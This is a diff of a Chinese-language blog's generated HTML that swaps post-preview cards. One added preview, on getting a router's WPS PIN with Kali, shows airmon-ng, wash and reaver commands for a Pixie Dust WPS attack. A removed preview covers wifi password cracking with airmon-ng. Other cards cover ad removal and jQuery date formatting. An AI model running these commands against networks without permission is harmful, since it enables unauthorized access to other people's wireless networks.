@@ -6037,6 +6037,30 @@
   
 
   
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
     
   
 
@@ -9384,7 +9408,7 @@
         
         
         <div class="col">
-          <a href="/posts/ruhe-quchu-youdaoyun-de-guanggao/" class="card post-preview h-100">
+          <a href="/posts/kali-qu-luyouqi-pinma/" class="card post-preview h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -9397,14 +9421,14 @@
 
 <em
   class="small"
-  data-ts="1649206020"
+  data-ts="1649569620"
   data-df="ll"
   
 >
-  Apr  6, 2022
+  Apr 10, 2022
 </em>
 
-              <h4 class="pt-0 my-2" data-toc-skip>如何去除有道云笔记广告</h4>
+              <h4 class="pt-0 my-2" data-toc-skip>Kali拿取路由器pin码</h4>
               <div class="text-muted small">
                 <p>
                   
@@ -9413,17 +9437,33 @@
 
 
 
-                  一、适用于6.0之前版本
-你只需要找到有道云笔记的安装路径*\Youdao\YoudaoNote\theme\build.xml，把下面的代码删掉
+                  网卡监听模式
+1
+airmon-ng start wlan0　　
+
+
+
+
+扫描
+1
+wash -i wlan0mon
+
+
+
+
+跑pin
 1
 2
-3
-4
-5
-6
-7
-&amp;lt;PanelAd type=&quot;adpanel&quot; css=&quot;public&quot; ass=&quot;mainform panelclient PanelAd&quot;&amp;gt;
-         &amp;lt;panelTopLine type...
+            网卡          物理地址         信道
+reaver -i wlan0mon -b 00:5A:13:40:AA:F8 -c 11 -vv -K 0
+
+
+
+
+通过pin获得wifi密码
+1
+2
+        ...
                 </p>
               </div>
             </div>
@@ -9433,7 +9473,7 @@
         
         
         <div class="col">
-          <a href="/posts/kali-pojie-wifi/" class="card post-preview h-100">
+          <a href="/posts/jquery-geshihua-shijian/" class="card post-preview h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -9446,14 +9486,14 @@
 
 <em
   class="small"
-  data-ts="1649483220"
+  data-ts="1650347220"
   data-df="ll"
   
 >
-  Apr  9, 2022
+  Apr 19, 2022
 </em>
 
-              <h4 class="pt-0 my-2" data-toc-skip>Kali暴力破解wifi密码</h4>
+              <h4 class="pt-0 my-2" data-toc-skip>JQuery格式化时间</h4>
               <div class="text-muted small">
                 <p>
                   
@@ -9462,31 +9502,33 @@
 
 
 
-                  查看本机网卡名称
-1
-ifconfig
+                  1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+$(function(){
+    alert(getDateString(new Date(&quot;2022-04-19&quot;)));
+});
 
-
-
-  eth0有线网卡
-  wlan0无线网卡
-
-
-虚拟机无法访问网卡，所以需要使用外接的USB无线网卡。
-
-查看是否支持监听模式
-1
-airmon-ng
-
-
-如果该命令没有任何输出则表示没有可以支持监听模式的网卡。
-
-开启无线网卡的监听模式
-1
-airmon-ng start wlan0
-
-
-如果airmon-ng显示的是wifi0，就把wlan...
+function getDateString(time) {
+    var datetime = new Date();
+    datetime.se...
                 </p>
               </div>
             </div>
